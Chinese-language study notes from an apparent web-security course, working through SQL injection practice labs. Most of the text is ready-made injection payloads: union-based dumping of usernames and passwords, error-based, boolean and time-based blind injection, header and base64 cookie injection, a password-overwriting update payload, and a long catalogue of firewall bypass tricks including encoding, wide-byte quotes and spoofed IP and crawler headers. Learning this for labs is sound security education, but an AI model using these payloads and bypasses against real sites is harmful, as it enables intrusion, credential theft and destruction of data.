
html + javascript 前端

2个python 网络安全类目大基础（适合编程入门）

安全更高级 add类目

红队/自己开发 = python后期

挖掘漏洞 （src漏洞平台）= 代码审计

======================



自己建立一个网站

site:目标网站 aspx/php/jsp...

备份文件：

www.xxx.com/xxx.zip 网站管理员的备份文件/安装文件

.rar .zip .7z .bak .tar .tar.gz .swp

网站的说明文档

robots.txt 指导搜索引擎蜘蛛应该/不应该访问什么地方

==================

mysql小知识：

mysql -u[用户名] -p[密码]

show databases; 
查看数据库

use haha; 
使用haha这个库

show tables;
查看这个库里有什么表

select * from [表名];
查看表中所有内容

union 联合

select [内容];
出现一个内容和列名都一样的东西

表中/提取的东西只有多少列，那么后面跟的select的东西只有多少个

\ 转义字符
把自己后面第一个字符当作字符串
x\' == 字符串的x'

注释符：
--+ （大都数用在get情况，因为get情况下地址栏+等于空格）
/**/
#

============================

select * from 表 where id = '1'  --+' limit 0,1

order by 3 正确，发现有3列

id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 0,1 --+

id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='users' limit 0,1 --+

id=-1' union select 1,group_concat(usrname),group_concat(password) from users --+

==========================

1-4搞定

LIMBO 2023/1/3 11:56:22
小知识：

select count(*) from users;
计算一下有多少个结果

select rand();
取0-1之间的随机数

select floor(1.99);
向下取整

select floor(rand()*2);
取0-1之间的随机整数

select * from users group by id;
用id进行排序

select concat(1,2,3);
连接内容

0x3a => :

select concat(0x3a,0x3a,(database()),0x3a,0x3a)a;
查询数据库库名，并且取名为a

select concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a;

select floor(rand()*2) from information_schema.columns;

select concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;

select concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;

select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;

select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
这个语句中，会进行两次随机数计算，有可能会出错

group by
select job,count(*) from table1 group by job;
此时group by会按照字母大小写进行排序



```sql
爆出库名
index.php?id=2' AND (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+

爆出表名
index.php?id=2' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
```



----------

简单高效：

' and extractvalue(1,concat(0x7e,(database()),0x7e)) --+

' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+

布尔型注入:

你觉得这个地方进行了数据库查询，但是没有显示位，但是报错不会出现信息，错误和正确页面有区别

靠猜
=======================================================
?id=2' and 0 --+
?id=2' and 1<2 --+
判断一下后面是否可以夹带私货

小知识：
select length(database());
取出数据库库名，并且判断有几个字

select substr(database(),1,1);
截取数据库库名，从第1个字开始截取，截取1个

select ascii(substr(database(),1,1));
截取出来的字，使用ascii码编码

select ascii(substr(database(),1,1)) < 100;

实战：
id=1' and (select ascii(substr(database(),1,1))) < 115 --+

走流程
id=1' and (select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))) < 115 --+

=====================================================

布尔型时间盲注：

你觉得这个地方进行了数据库查询，但是没有显示位，但是报错不会出现信息，错误也不会告诉你

select sleep(5);
睡个5s

select if((select database())="haha",sleep(5),null);
判断一下数据库库名是不是haha，如果是，睡5s，不是就返回null

实战：
id=2' and sleep(5) --+
说明可以睡觉

id=2' and if((select database())="security",sleep(5),null) --+

id=2' and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(5),null) --+

database() 如果不想写，可以写security的hex值

===============================================

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>haha</title>
</head>
<body>

<form action="" method="POST">
username:<input type="text" name="uname" /><br/>
password:<input type="password" name="upwd"/><br/>
<input type="submit" value="click me"/>

</form>

<?php

$name = $_POST['uname'];
$pwd = $_POST['upwd'];

if($name=="admin"&&$pwd=="123"){
    echo "success";
}else{
    echo "fail";
}


?>


</body>
</html>
post 注入

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>haha</title>
</head>
<body>

<form action="" method="POST">
username:<input type="text" name="uname" /><br/>
password:<input type="password" name="upwd"/><br/>
<input type="submit" value="click me"/>

</form>

<?php

$name = $_POST['uname'];
$pwd = $_POST['upwd'];

if($name=="admin"&&$pwd=="123"){
    echo "success";
}else{
    echo "fail";
}


?>


</body>
</html>

-----------

猜测源码

uname=xxxxx&passwd=xxxxxx

$u = $_POST['uname'];
$p = $_POST['passwd'];

方法1：

select username,password from table1 where username='$u' and password='$p' limit 0,1;

select username,password from table1 where username=' ' or 1=1 # ' and password='123' limit 0,1;

select username,password from table1 where username=' ' or 1=1 

select username,password from table1 where username=' ' union select 1,2 #  ' and password='$p' limit 0,1;

方法2：
burp
抓包之后，send to repater

uname=' union select 1,database() #&passwd=123&submit=Submit

======================================================

post盲注

猜闭合方式

' or 1=1 #

用户名和密码都写!!!!
' or '1' = '1

select username,password from table1 where username='' or '1'='1
' and password='' or '1'='1' limit 0,1;

admin' and if(ascii(substr(database(),1,1))=115,sleep(5),null) #

LIMBO 2023/1/3 16:13:58
less-17修改密码
（本题危害比较大）

update users set password='$p' where username='$u'

admin
' or 1=1 #

update users set password='' or 1=1 #' where username='admin'

会把数据库所有密码都改为1
update users set password=1

less-18开始http头注入

user-agent

insert into 'security'.'某个表'(uagent,ipadd,username) values('浏览器信息','ip地址','用户名')

使用\ 判断单引号闭合

' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1


insert into 'security'.'某个表'(uagent,ipadd,username) values('' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1','ip地址','用户名')

------

referer
来路流量（你是从哪个地方来的）

-------


cookie

admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #

cookie进行base64编码的

输入攻击语句之后，转化为base64encode即可
admin') and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
编码之后
YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkgIw==

===================

主线任务：
less1-22全部搞定

争取不要看笔记，全流程！！！（除了盲注）

支线任务：
下载wireshark（windows版），抓http的数据包

如果想预习：
https://ke.huayunsys.com/courses/show2/14
11-30

==============================================
防火墙
参数# -- 过滤

?id=1' or '1'='1

?id=1' union select 1,database(),'3


select * from table1 where id='1' limit 0,1

select * from table1 where id=' ' union select 1,database(),'3  ' limit 0,1

-------------

越权漏洞

$old_pass = $_POST['old_pass'];
$new_pass1 = $_POST['new_pass1'];
$new_pass2 = $_POST['new_pass2'];

if($new_pass1==$new_pass2){
    
    //执行修改密码
    update users set password='$new_pass1' where username='admin' and password='$old_pass';
}

update users set password='123' where username='  admin' #   ' and password='$old_pass';

update users set password='123' where username='  admin'

================

防火墙屏蔽or and

or = || = url编码

and = && = url编码

?id=2' || extractvalue(1,(concat(0x7e,database(),0x7e))) || '1'='1

================

屏蔽or and 空格 注释符

替代空格的东西
%09 水平tab键
%0a 新建一行
%0c 新建一页
%0d 回车键
%0b 垂直tab键
%a0 也是空格键

屏蔽-号
报错条件 0 20000000000

?id=2000000'%0aunion%0aselect%0a1,2,3%0a||%0a'1'='1
如果哪天%的空格都不能用，不用空格
无空格写法
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(database())),0x7e),1))||'
宽字节注入
小知识:
对' \ 屏蔽，前面多加个\
数据库用的是gbk编码，会把2个字符当作一个汉字

?id=1%df\'

post类
burp抓包
在目标位置admin%df%27 union select 1,2 #
把%df%27框起来，右键-convert selection-url--url decode

因为GET会自动把数据进行url解码，post不会把数据进行url解码，所以我们需要手工操作

==================

奇淫巧计：

常见绕过：
1.大小写绕过
Union SelEct

2.双写绕过
ununionion

3.编码绕过
security-->hex编码
urlencode

4.注释符/**/
uni/**/on sel/**/ect

5.对于空格绕过

6.对于or and绕过
and = &&
or = ||

7.单引号
%df%27

8.反引号
反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！
select username,password from `table1` where id='1' limit 0,1

where

select * from `where` where id =1

9.内联注释
and /*!select*/ 1,2

10.<>绕过
uni<>on sel<>ect

select * from users where id=1 and ascii(substr(database(),0,1)) > 115
greatest least

select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64

11.屏蔽逗号
select substr("xxxxx",1,3)
select substr("xxxxx" from 1 to 3)

union select 1,2,3
union select * from (select 1)a join (select 2)b join (select 3)c;

limit 0,1
limit 0 offset 1

12.sleep屏蔽
and sleep(1)
and benchmark(100000000,1);

13.group_concat屏蔽
select group_concat("haha","niao");
select concat_ws(" ","haha","niao");

14.等号屏蔽
like rlike regexp <>
?id=1' or 1 like 1
?id=1' or 1 <> 1

15.post情况屏蔽#
id=3") or 1=1 -- a 使用--空格a可以在post情况下替代#

16.ip地址拦截
X-forwarded-for
X-remote-IP
X-Originating-IP
X-remote-addr
X-Real-Ip

17.修改静态资源
http://www.xx.com/sql.php?id=1
可以替换为
http://www.xx.com/sql.php/1.js?id=1

18.url白名单
为了防止防火墙误伤，部分waf内置白名单列表 admin manager system....

http://www.xx.com/sql.php/admin.php?id=1

http://www.xx.com/sql.php?xxxx=/manager/&b=攻击代码

http://www.xx.com/../../../../manager/../sql.php?id=1

19.爬虫白名单
伪造自己是搜索引擎（修改user-agent）

20.数据库注释执行
/*!50001 select * from table1*/;
如果数据库版本是5.00.01 版本以下的，语句才会执行
/*!45509 union select */ 1,2,3 --+

21.增加干扰
union all %23%a0 select 1,2,3 --+
SELECT * FROM users WHERE username='$username' AND password='$password'

SELECT * FROM users WHERE username=' admin' or '1'='1 ' AND password=' 123 '

--------

SELECT * FROM users WHERE username='$username'

SELECT * FROM users WHERE username=' x' union select 1,'admin',md5('haha') #'

所以用户名输入
x' union select 1,'admin',md5('haha') #
密码haha

---------

UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1

bill`=111,`george`=`george

UPDATE noescvotes SET `bill`=111,`george`=`george`=`bill`=111,`george`=`george`+1 WHERE id=1

---------





